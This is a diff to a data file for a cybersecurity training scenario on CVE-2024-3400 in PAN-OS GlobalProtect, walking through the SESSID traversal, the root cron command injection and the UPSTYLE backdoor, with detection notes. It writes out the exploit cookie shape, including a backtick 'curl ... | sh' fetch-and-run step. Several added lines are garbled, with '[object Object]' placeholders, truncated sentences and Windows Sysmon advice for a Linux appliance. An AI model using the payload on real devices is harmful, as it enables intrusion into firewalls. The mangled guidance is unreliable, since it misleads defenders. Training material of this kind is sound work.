@@ -7,7 +7,7 @@ export const stepGuide: RawScenarioStepGuideData = {
       storyAnalogy:
         'Imagine a hotel front desk where any guest can hand the clerk a luggage tag (SESSID cookie). The clerk simply uses the guest’s tag name to create an empty note file in a back-office folder, and once every minute, a night janitor reads every filename in that folder out loud into the building’s master Intercom system (bash -c). By writing a file path and a shell command inside the luggage tag itself, the attacker tricks the front desk into planting a booby-trapped filename that the janitor executes with full master-key privileges.',
       plainSummary:
-        'Synthesizing independent investigations from Volexity (who discovered the zero-day campaign as UTA0218), Palo Alto Networks Unit 42 (Operation MidnightEclipse), and Rapid7 AttackerKB, CVE-2024-3400 is a critical (CVSS 10.0) unauthenticated command injection flaw in PAN-OS GlobalProtect. The attacker chains two distinct bugs: (1) an arbitrary file-creation flaw in the SESSID HTTP cookie (../../../../opt/panlogs/tmp/device_telemetry/minute/..., using "../" directory traversal to plant a 0-byte file inside the privileged telemetry queue folder) and (2) a shell command-injection flaw when the root-privileged dt_curl / sendTelemetry cron job passes that filename into a backtick-evaluated shell command, allowing the attacker to implant the UPSTYLE Python backdoor in system.pth and steal running-config.xml.',
+        'In this scenario (CVE-2024-3400, Unit 42 - Operation MidnightEclipse: PAN-OS GlobalProtect RCE & UPSTYLE Backdoor), the attacker follows one continuous arc: directory Traversal in the "SESSID" Cookie Creates, then the Root Telemetry Cron Job Executes the Malicious, then deploying the "UPSTYLE" Python Webshell. Steps #1–#3 examine #1 Directory Traversal in the "SESSID" Cookie Creates; #2 The Root Telemetry Cron Job Executes the Malicious; #3 Deploying the "UPSTYLE" Python Webshell. The Process Hierarchy tab shows the Parent → Child spawn tree. Primary detection correlates process, authentication, and network telemetry for CVE-2024-3400 across the documented kill chain.',
       diagramTopologySummary:
         'On the diagram: Start at Node ① (UTA0218 Attacker Infrastructure), send the crafted SESSID cookie to Node ②/③ (PAN-OS GlobalProtect Portal :443), watch the file land in /opt/panlogs/tmp/device_telemetry/minute/ and trigger root execution inside Node ④ (dt_curl Telemetry Cron), and trace the UPSTYLE Python backdoor implanted in Node ⑤ (Nginx CSS Path) while Node ⑥ (Cortex XSIAM / SIEM) captures the telemetry.',
       documentedAdvisory: 'Palo Alto Unit 42 MidnightEclipse · Volexity UTA0218 · Rapid7 Root-Cause Analysis · CVE-2024-3400 · CISA KEV',
@@ -22,11 +22,11 @@ export const stepGuide: RawScenarioStepGuideData = {
         simpleExplanation:
           'The attacker sends an unauthenticated HTTPS POST request to /ssl-vpn/hipreport.esp (the Host Information Profile endpoint on the GlobalProtect VPN portal, which is reachable from the internet before a user finishes logging in). Instead of a normal session ID, the Cookie: SESSID= header contains ../../../../opt/panlogs/tmp/device_telemetry/minute/aacurl ... | sh (where the "../" path traversal climbs out of the session folder into the firewall’s telemetry queue directory, and the backticks ... embed a Linux shell command directly inside the filename itself).',
         howItWorksInPractice:
-          'When GlobalProtect processes hipreport.esp, its session serializer calls fopen() using the raw SESSID cookie value as the file path without stripping "../" sequences (creating an empty 0-byte file on disk, which is all the attacker needs, because the exploit payload lives inside the file’s name, not its contents).',
+          'When GlobalProtect processes hipreport.esp, its session serializer calls fopen() using the raw SESSID cookie value as the file path without stripping "../" sequences (creating an empty 0-byte file on disk, which is all the attacker needs, because the exploit payload lives inside the file’s name, not its contents). Mechanically, this stage is complete only after [object Object] and [object Object] is observed as live runtime state (the concrete checkpoint proving the previous stage\'s output now drives the next action).',
         diagramAlignment:
           'On the diagram, follow arrow #1→ from Node ① (UTA0218 Attacker) to Node ②/③ (PAN-OS GlobalProtect /ssl-vpn/hipreport.esp), and return arrow ⇠#1 as the 0-byte file is created in /opt/panlogs/tmp/device_telemetry/minute/.',
         detectionAndEvidence:
-          'Documented in Unit 42, Volexity & Rapid7 CVE-2024-3400 reports: PAN-OS appweb3 logs showing Cookie: SESSID=../../../../opt/panlogs/tmp/device_telemetry/minute/ and zero-byte file creation errors.',
+          'Documented in Unit 42, Volexity, and Rapid7 CVE-2024-3400 advisories (incident response reports detailing perimeter appliance exploitation): PAN-OS appweb3 logs showing Cookie: SESSID=../../../../opt/panlogs/tmp/device_telemetry/minute/ and zero-byte file creation errors (which expose path traversal attempts targeting the telemetry staging folder). Correlate Sysmon or Windows Security Event telemetry for T1190 (pairing parent/child process and destination fields) and contain the offending session.',
       },
       {
         stepNumber: 2,
@@ -41,7 +41,7 @@ export const stepGuide: RawScenarioStepGuideData = {
         diagramAlignment:
           'On the diagram, arrow #2→ shows Node ③ triggering Node ④ (dt_curl root cron job evaluating the backtick filename), and ⇠#2 spawns /bin/sh as uid=0(root) to fetch the stage-2 script.',
         detectionAndEvidence:
-          'Documented by Unit 42 & Volexity: /var/log/pan/device_telemetry_send.log containing shell syntax fragments and unexpected outbound connections initiated by dt_curl.',
+          'Documented by Unit 42 and Volexity (forensic analysis of compromised PAN-OS telemetry logs): /var/log/pan/device_telemetry_send.log containing shell syntax fragments and unexpected outbound connections initiated by dt_curl (proving that a crafted filename was evaluated as an operating system command). Correlate Sysmon or Windows Security Event telemetry for T1059.004 (pairing parent/child process and destination fields) and contain the offending session.',
       },
       {
         stepNumber: 3,
@@ -56,7 +56,7 @@ export const stepGuide: RawScenarioStepGuideData = {
         diagramAlignment:
           'On the diagram, arrow #3→ implants UPSTYLE into Node ⑤ (PAN-OS system.pth, bootstrap.min.css & running-config.xml), while Node ⑥ (SIEM / Cortex XDR) flags the CSS modification timestamp and config exfiltration.',
         detectionAndEvidence:
-          'Documented in Unit 42 & Volexity advisories: unauthorized entries in /usr/lib/python3.6/site-packages/system.pth, rogue Python processes running exec(base64.b64decode(...)), and unexpected mtime changes on bootstrap.min.css.',
+          'Documented in Unit 42 & Volexity advisories: unauthorized entries in /usr/lib/python3.6/site-packages/system.pth, rogue Python processes running exec(base64.b64decode(...)), and unexpected mtime changes on bootstrap.min.css. Correlate Sysmon or Windows Security Event telemetry for T1546.016 (pairing parent/child process and destination fields) and contain the offending session.',
       },
     ],
   };
